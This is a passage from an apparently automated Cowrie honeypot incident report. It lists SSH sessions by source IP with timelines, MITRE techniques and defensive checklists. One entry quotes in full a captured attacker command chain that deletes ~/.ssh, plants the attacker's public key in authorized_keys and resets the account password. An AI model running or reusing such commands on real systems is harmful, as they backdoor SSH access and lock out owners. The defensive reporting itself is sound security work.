| `2026-07-29 21:43:01` | `cowrie.login.success` |
| `2026-07-29 21:43:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.30.40[.]129` to AbuseIPDB if not already reported
- [ ] Block `103.30.40[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3185483a66d1

| Field | Detail |
|---|---|
| **Source IP** | `103.30.40[.]129` |
| **First Seen** | 2026-07-29 21:43 |
| **Last Seen** | 2026-07-29 21:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:43:02` | `cowrie.session.connect` |
| `2026-07-29 21:43:02` | `cowrie.client.version` |
| `2026-07-29 21:43:02` | `cowrie.client.kex` |
| `2026-07-29 21:43:03` | `cowrie.login.success` |
| `2026-07-29 21:43:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.30.40[.]129` to AbuseIPDB if not already reported
- [ ] Block `103.30.40[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bc6ebc5383d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-29 21:54 |
| **Last Seen** | 2026-07-29 21:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:54:39` | `cowrie.session.connect` |
| `2026-07-29 21:54:39` | `cowrie.client.version` |
| `2026-07-29 21:54:39` | `cowrie.client.kex` |
| `2026-07-29 21:54:39` | `cowrie.login.success` |
| `2026-07-29 21:54:39` | `cowrie.direct-tcpip.request` |
| `2026-07-29 21:54:40` | `cowrie.direct-tcpip.data` |
| `2026-07-29 21:54:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-074c2e9a4e7d

| Field | Detail |
|---|---|
| **Source IP** | `65.20.149[.]26` |
| **First Seen** | 2026-07-29 21:57 |
| **Last Seen** | 2026-07-29 21:57 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:57:34` | `cowrie.session.connect` |
| `2026-07-29 21:57:35` | `cowrie.client.version` |
| `2026-07-29 21:57:35` | `cowrie.client.kex` |
| `2026-07-29 21:57:40` | `cowrie.login.success` |
| `2026-07-29 21:57:41` | `cowrie.direct-tcpip.request` |
| `2026-07-29 21:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.149[.]26` to AbuseIPDB if not already reported
- [ ] Block `65.20.149[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd56da805d5b

| Field | Detail |
|---|---|
| **Source IP** | `95.79.108[.]51` |
| **First Seen** | 2026-07-29 21:57 |
| **Last Seen** | 2026-07-29 21:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:57:51` | `cowrie.session.connect` |
| `2026-07-29 21:57:51` | `cowrie.client.version` |
| `2026-07-29 21:57:51` | `cowrie.client.kex` |
| `2026-07-29 21:57:52` | `cowrie.login.success` |
| `2026-07-29 21:57:53` | `cowrie.direct-tcpip.request` |
| `2026-07-29 21:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.79.108[.]51` to AbuseIPDB if not already reported
- [ ] Block `95.79.108[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea7862b05302

| Field | Detail |
|---|---|
| **Source IP** | `218.202.143[.]68` |
| **First Seen** | 2026-07-29 21:58 |
| **Last Seen** | 2026-07-29 21:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:58:33` | `cowrie.session.connect` |
| `2026-07-29 21:58:34` | `cowrie.client.version` |
| `2026-07-29 21:58:34` | `cowrie.client.kex` |
| `2026-07-29 21:58:36` | `cowrie.login.success` |
| `2026-07-29 21:58:37` | `cowrie.direct-tcpip.request` |
| `2026-07-29 21:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.202.143[.]68` to AbuseIPDB if not already reported
- [ ] Block `218.202.143[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acc58af7efb5

| Field | Detail |
|---|---|
| **Source IP** | `61.37.150[.]6` |
| **First Seen** | 2026-07-29 21:58 |
| **Last Seen** | 2026-07-29 21:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:58:42` | `cowrie.session.connect` |
| `2026-07-29 21:58:43` | `cowrie.client.version` |
| `2026-07-29 21:58:43` | `cowrie.client.kex` |
| `2026-07-29 21:58:45` | `cowrie.login.success` |
| `2026-07-29 21:58:46` | `cowrie.direct-tcpip.request` |
| `2026-07-29 21:58:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.37.150[.]6` to AbuseIPDB if not already reported
- [ ] Block `61.37.150[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9337dfa76b6

| Field | Detail |
|---|---|
| **Source IP** | `218.23.95[.]14` |
| **First Seen** | 2026-07-29 21:59 |
| **Last Seen** | 2026-07-29 22:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:59:55` | `cowrie.session.connect` |
| `2026-07-29 21:59:56` | `cowrie.client.version` |
| `2026-07-29 21:59:56` | `cowrie.client.kex` |
| `2026-07-29 21:59:58` | `cowrie.login.success` |
| `2026-07-29 21:59:59` | `cowrie.direct-tcpip.request` |
| `2026-07-29 22:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.23.95[.]14` to AbuseIPDB if not already reported
- [ ] Block `218.23.95[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-192e672bdabb

| Field | Detail |
|---|---|
| **Source IP** | `116.181.10[.]189` |
| **First Seen** | 2026-07-29 22:00 |
| **Last Seen** | 2026-07-29 22:01 |
| **Session Duration** | 52s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo -e "12345678\nbYGI544Nh7OO\nbYGI544Nh7OO"|passwd|bash, Enter new UNIX password: ` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:00:22` | `cowrie.session.connect` |
| `2026-07-29 22:00:24` | `cowrie.client.version` |
| `2026-07-29 22:00:24` | `cowrie.client.kex` |
| `2026-07-29 22:00:24` | `cowrie.login.success` |
| `2026-07-29 22:00:26` | `cowrie.session.params` |
| `2026-07-29 22:00:26` | `cowrie.command.input` |
| `2026-07-29 22:00:26` | `cowrie.command.failed` |
| `2026-07-29 22:00:26` | `cowrie.log.closed` |
| `2026-07-29 22:00:27` | `cowrie.session.params` |
| `2026-07-29 22:00:27` | `cowrie.command.input` |
| `2026-07-29 22:00:27` | `cowrie.session.file_download` |
| `2026-07-29 22:00:27` | `cowrie.log.closed` |
| `2026-07-29 22:00:56` | `cowrie.session.params` |
| `2026-07-29 22:00:56` | `cowrie.command.input` |
| `2026-07-29 22:00:56` | `cowrie.log.closed` |
| `2026-07-29 22:00:57` | `cowrie.session.params` |
| `2026-07-29 22:00:57` | `cowrie.command.input` |
| `2026-07-29 22:00:57` | `cowrie.command.input` |
| `2026-07-29 22:00:57` | `cowrie.command.failed` |
| `2026-07-29 22:00:58` | `cowrie.log.closed` |
| `2026-07-29 22:00:58` | `cowrie.session.params` |
| `2026-07-29 22:00:58` | `cowrie.command.input` |
| `2026-07-29 22:00:59` | `cowrie.log.closed` |
| `2026-07-29 22:01:00` | `cowrie.session.params` |
| `2026-07-29 22:01:00` | `cowrie.command.input` |
| `2026-07-29 22:01:00` | `cowrie.log.closed` |
| `2026-07-29 22:01:01` | `cowrie.session.params` |
| `2026-07-29 22:01:01` | `cowrie.command.input` |
| `2026-07-29 22:01:01` | `cowrie.log.closed` |
| `2026-07-29 22:01:02` | `cowrie.session.params` |
| `2026-07-29 22:01:02` | `cowrie.command.input` |
| `2026-07-29 22:01:02` | `cowrie.command.input` |
| `2026-07-29 22:01:02` | `cowrie.log.closed` |
| `2026-07-29 22:01:03` | `cowrie.session.params` |
| `2026-07-29 22:01:03` | `cowrie.command.input` |
| `2026-07-29 22:01:04` | `cowrie.log.closed` |
| `2026-07-29 22:01:04` | `cowrie.session.params` |
| `2026-07-29 22:01:04` | `cowrie.command.input` |
| `2026-07-29 22:01:05` | `cowrie.log.closed` |
| `2026-07-29 22:01:06` | `cowrie.session.params` |
| `2026-07-29 22:01:06` | `cowrie.command.input` |
| `2026-07-29 22:01:06` | `cowrie.log.closed` |
| `2026-07-29 22:01:07` | `cowrie.session.params` |
| `2026-07-29 22:01:07` | `cowrie.command.input` |
| `2026-07-29 22:01:07` | `cowrie.log.closed` |
| `2026-07-29 22:01:08` | `cowrie.session.params` |
| `2026-07-29 22:01:08` | `cowrie.command.input` |
| `2026-07-29 22:01:09` | `cowrie.log.closed` |
| `2026-07-29 22:01:09` | `cowrie.session.params` |
| `2026-07-29 22:01:09` | `cowrie.command.input` |
| `2026-07-29 22:01:10` | `cowrie.log.closed` |
| `2026-07-29 22:01:11` | `cowrie.session.params` |
| `2026-07-29 22:01:11` | `cowrie.command.input` |
| `2026-07-29 22:01:11` | `cowrie.log.closed` |
| `2026-07-29 22:01:12` | `cowrie.session.params` |
| `2026-07-29 22:01:12` | `cowrie.command.input` |
| `2026-07-29 22:01:12` | `cowrie.log.closed` |
| `2026-07-29 22:01:13` | `cowrie.session.params` |
| `2026-07-29 22:01:13` | `cowrie.command.input` |
| `2026-07-29 22:01:14` | `cowrie.log.closed` |
| `2026-07-29 22:01:14` | `cowrie.session.params` |
| `2026-07-29 22:01:14` | `cowrie.command.input` |
| `2026-07-29 22:01:15` | `cowrie.log.closed` |
| `2026-07-29 22:01:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.181.10[.]189` to AbuseIPDB if not already reported
- [ ] Block `116.181.10[.]189` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfcce6bd092a

| Field | Detail |
|---|---|
| **Source IP** | `63.135.169[.]175` |
| **First Seen** | 2026-07-29 22:02 |
| **Last Seen** | 2026-07-29 22:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:02:19` | `cowrie.session.connect` |
| `2026-07-29 22:02:20` | `cowrie.client.version` |
| `2026-07-29 22:02:20` | `cowrie.client.kex` |
| `2026-07-29 22:02:21` | `cowrie.login.success` |
| `2026-07-29 22:02:21` | `cowrie.direct-tcpip.request` |
| `2026-07-29 22:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `63.135.169[.]175` to AbuseIPDB if not already reported
- [ ] Block `63.135.169[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe3dcfc16b8c

| Field | Detail |
|---|---|
| **Source IP** | `180.180.232[.]242` |
| **First Seen** | 2026-07-29 22:02 |
| **Last Seen** | 2026-07-29 22:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:02:27` | `cowrie.session.connect` |
| `2026-07-29 22:02:28` | `cowrie.client.version` |
| `2026-07-29 22:02:28` | `cowrie.client.kex` |
| `2026-07-29 22:02:30` | `cowrie.login.success` |
| `2026-07-29 22:02:31` | `cowrie.direct-tcpip.request` |
| `2026-07-29 22:02:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.180.232[.]242` to AbuseIPDB if not already reported
- [ ] Block `180.180.232[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6c5214dca7f

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]61` |
| **First Seen** | 2026-07-29 22:17 |
| **Last Seen** | 2026-07-29 22:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:17:01` | `cowrie.session.connect` |
| `2026-07-29 22:17:01` | `cowrie.client.version` |
| `2026-07-29 22:17:01` | `cowrie.client.kex` |
| `2026-07-29 22:17:02` | `cowrie.login.success` |
| `2026-07-29 22:17:03` | `cowrie.direct-tcpip.request` |
| `2026-07-29 22:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]61` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc6bde5e8ace

| Field | Detail |
|---|---|
| **Source IP** | `196.191.151[.]172` |
| **First Seen** | 2026-07-29 22:17 |
| **Last Seen** | 2026-07-29 22:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:17:12` | `cowrie.session.connect` |
| `2026-07-29 22:17:12` | `cowrie.client.version` |
| `2026-07-29 22:17:12` | `cowrie.client.kex` |
| `2026-07-29 22:17:14` | `cowrie.login.success` |
| `2026-07-29 22:17:14` | `cowrie.direct-tcpip.request` |
| `2026-07-29 22:17:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.191.151[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.191.151[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0a1b2d1027c

| Field | Detail |
|---|---|
| **Source IP** | `208.109.38[.]143` |
| **First Seen** | 2026-07-29 22:34 |
| **Last Seen** | 2026-07-29 22:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:34:59` | `cowrie.session.connect` |
| `2026-07-29 22:34:59` | `cowrie.client.version` |
| `2026-07-29 22:34:59` | `cowrie.client.kex` |
| `2026-07-29 22:35:01` | `cowrie.login.success` |
| `2026-07-29 22:35:01` | `cowrie.direct-tcpip.request` |
| `2026-07-29 22:35:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `208.109.38[.]143` to AbuseIPDB if not already reported
- [ ] Block `208.109.38[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-657846761856

| Field | Detail |
|---|---|
| **Source IP** | `117.247.77[.]115` |
| **First Seen** | 2026-07-29 22:35 |
| **Last Seen** | 2026-07-29 22:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:35:07` | `cowrie.session.connect` |
| `2026-07-29 22:35:07` | `cowrie.client.version` |
| `2026-07-29 22:35:07` | `cowrie.client.kex` |
| `2026-07-29 22:35:09` | `cowrie.login.success` |
| `2026-07-29 22:35:10` | `cowrie.direct-tcpip.request` |
| `2026-07-29 22:35:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.247.77[.]115` to AbuseIPDB if not already reported
- [ ] Block `117.247.77[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9ae339b00f6

| Field | Detail |
|---|---|
| **Source IP** | `153.37.177[.]219` |
| **First Seen** | 2026-07-29 22:35 |
| **Last Seen** | 2026-07-29 22:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:35:08` | `cowrie.session.connect` |
| `2026-07-29 22:35:09` | `cowrie.client.version` |
| `2026-07-29 22:35:09` | `cowrie.client.kex` |
| `2026-07-29 22:35:12` | `cowrie.login.success` |
| `2026-07-29 22:35:12` | `cowrie.direct-tcpip.request` |
| `2026-07-29 22:35:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.37.177[.]219` to AbuseIPDB if not already reported
- [ ] Block `153.37.177[.]219` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da3fcfb32695

| Field | Detail |
|---|---|
| **Source IP** | `181.129.31[.]42` |
| **First Seen** | 2026-07-29 22:37 |
| **Last Seen** | 2026-07-29 22:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:37:17` | `cowrie.session.connect` |
| `2026-07-29 22:37:18` | `cowrie.client.version` |
| `2026-07-29 22:37:18` | `cowrie.client.kex` |
| `2026-07-29 22:37:19` | `cowrie.login.success` |
| `2026-07-29 22:37:20` | `cowrie.direct-tcpip.request` |
| `2026-07-29 22:37:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.129.31[.]42` to AbuseIPDB if not already reported
- [ ] Block `181.129.31[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c73a18966251

| Field | Detail |
|---|---|
| **Source IP** | `183.104.220[.]84` |
| **First Seen** | 2026-07-29 22:37 |
| **Last Seen** | 2026-07-29 22:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:37:25` | `cowrie.session.connect` |
| `2026-07-29 22:37:26` | `cowrie.client.version` |
| `2026-07-29 22:37:26` | `cowrie.client.kex` |
| `2026-07-29 22:37:28` | `cowrie.login.success` |
| `2026-07-29 22:37:28` | `cowrie.direct-tcpip.request` |
| `2026-07-29 22:37:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.104.220[.]84` to AbuseIPDB if not already reported
- [ ] Block `183.104.220[.]84` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-084cd7a445fc

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-29 22:38 |
| **Last Seen** | 2026-07-29 22:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:38:22` | `cowrie.session.connect` |
| `2026-07-29 22:38:22` | `cowrie.client.version` |
| `2026-07-29 22:38:22` | `cowrie.client.kex` |
| `2026-07-29 22:38:22` | `cowrie.login.success` |
| `2026-07-29 22:38:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29ba7e3ce96a

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-29 22:38 |
| **Last Seen** | 2026-07-29 22:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:38:22` | `cowrie.session.connect` |
| `2026-07-29 22:38:22` | `cowrie.client.version` |
| `2026-07-29 22:38:22` | `cowrie.client.kex` |
| `2026-07-29 22:38:23` | `cowrie.login.success` |
| `2026-07-29 22:38:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f952e66bdf5a

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-29 22:38 |
| **Last Seen** | 2026-07-29 22:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:38:32` | `cowrie.session.connect` |
| `2026-07-29 22:38:32` | `cowrie.client.version` |
| `2026-07-29 22:38:32` | `cowrie.client.kex` |
| `2026-07-29 22:38:32` | `cowrie.login.success` |
| `2026-07-29 22:38:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-458b4d56e3d4

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-29 22:38 |
| **Last Seen** | 2026-07-29 22:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:38:32` | `cowrie.session.connect` |
| `2026-07-29 22:38:32` | `cowrie.client.version` |
| `2026-07-29 22:38:32` | `cowrie.client.kex` |
| `2026-07-29 22:38:32` | `cowrie.login.success` |
| `2026-07-29 22:38:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5da27d772502

| Field | Detail |
|---|---|
| **Source IP** | `210.0.90[.]81` |
| **First Seen** | 2026-07-29 22:42 |
| **Last Seen** | 2026-07-29 22:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:42:35` | `cowrie.session.connect` |
| `2026-07-29 22:42:36` | `cowrie.client.version` |
| `2026-07-29 22:42:36` | `cowrie.client.kex` |
| `2026-07-29 22:42:39` | `cowrie.login.success` |
| `2026-07-29 22:42:39` | `cowrie.direct-tcpip.request` |
| `2026-07-29 22:42:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.0.90[.]81` to AbuseIPDB if not already reported
- [ ] Block `210.0.90[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1787077e7b5d

| Field | Detail |
|---|---|
| **Source IP** | `181.188.148[.]74` |
| **First Seen** | 2026-07-29 22:45 |
| **Last Seen** | 2026-07-29 22:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
